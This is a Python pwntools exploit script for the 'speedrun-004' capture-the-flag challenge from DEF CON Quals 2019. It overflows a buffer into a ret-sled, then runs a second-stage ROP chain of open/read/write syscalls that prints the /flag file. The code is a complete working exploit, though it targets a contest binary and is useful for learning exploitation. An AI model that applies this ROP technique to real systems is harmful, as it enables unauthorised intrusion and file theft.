#!/usr/bin/env python

from pwn import *

context(arch = 'amd64', os = 'linux')

exe = "./speedrun-004"
args = [ exe ]

r = process(args)
#r = remote('speedrun-004.quals2019.oooverflow.io', 31337)

#0x0000000000400686 : pop rdi ; ret
pop_rdi_ret = 0x400686

#0x0000000000410a93 : pop rsi ; ret
pop_rsi_ret = 0x410a93

#0x000000000044a155 : pop rdx ; ret
pop_rdx_ret = 0x44a155

#0x000000000041d4e3 : pop rcx ; ret
pop_rcx_ret = 0x41d4e3

#0x0000000000415f04 : pop rax ; ret
pop_rax_ret = 0x415f04

#0x0000000000400416 : ret
just_ret = 0x400416

#0x0000000000474f15 : syscall ; ret
syscall_ret = 0x474f15

#0x0000000000418c37 : mov qword ptr [rdx], rax ; ret
mov_ptr_rdx_from_rax_ret = 0x418c37

# address of the call to process_thought
call_process_thought = 0x400c3f

# find a writable section using 'readelf -S speedrun-004'
data_addr = 0x6b90e0


# write 8 bytes of data to the given address
def rop_put_mem8(addr, data):
        payload = ""
        payload += p64(pop_rdx_ret)
        payload += p64(addr)
        payload += p64(pop_rax_ret)
        payload += data
        payload += p64(mov_ptr_rdx_from_rax_ret)
        return payload

def rop_open(filename_addr, flags, mode):
        payload = ""
        payload += p64(pop_rdi_ret)
        payload += p64(filename_addr)
        payload += p64(pop_rsi_ret)
        payload += p64(flags)
        payload += p64(pop_rdx_ret)
        payload += p64(mode)
        payload += p64(pop_rax_ret)
        payload += p64(2)
        payload += p64(syscall_ret)
        return payload

def rop_read(fd, buf_addr, len):
        payload = ""
        payload += p64(pop_rdi_ret)
        payload += p64(fd)
        payload += p64(pop_rsi_ret)
        payload += p64(buf_addr)
        payload += p64(pop_rdx_ret)
        payload += p64(len)
        payload += p64(pop_rax_ret)
        payload += p64(0)
        payload += p64(syscall_ret)
        return payload

def rop_write(fd, buf_addr, len):
        payload = ""
        payload += p64(pop_rdi_ret)
        payload += p64(fd)
        payload += p64(pop_rsi_ret)
        payload += p64(buf_addr)
        payload += p64(pop_rdx_ret)
        payload += p64(len)
        payload += p64(pop_rax_ret)
        payload += p64(1)
        payload += p64(syscall_ret)
        return payload

def rop_cat_flag(data_addr):
 payload = ""
 payload += rop_put_mem8(data_addr, "/flag\x00\x00\x00")
 payload += rop_open(data_addr, 0, 0)
 payload += rop_read(3, data_addr, 256)
 payload += rop_write(1, data_addr, 256)
 return payload


print(r.recvuntil("how much do you have to say?"))
# send 257 and pad to the 9 bytes being read
r.send("257" + "\x00"*6)

print(r.recvuntil("Ok, what do you have to say for yourself?"))


# second stage shellcode overwrites the return address directly with a rop chain that will read the flag
shellcode2 = ""
shellcode2 += "A"*256  # buffer length
shellcode2 += "B"*8    # ebp
shellcode2 += rop_cat_flag(data_addr)
shellcode2 += p64(0)
shellcode2_len = len(shellcode2)

# first stage shellcode contains a ret-sled and then calling process_thought with a large length parameter to fit shellcode2
shellcode = ""
shellcode += p64(pop_rdi_ret)
shellcode += p64(shellcode2_len)
shellcode += p64(call_process_thought)

shellcode_len = len(shellcode)
print("shellcode len: %d" % shellcode_len)
print("shellcode2 len: %d" % shellcode2_len)
sled_rets = 32 - shellcode_len/8

r.send(p64(just_ret)*sled_rets + shellcode + "\x00")

# send the second stage shellcode
r.send(shellcode2)

r.interactive()
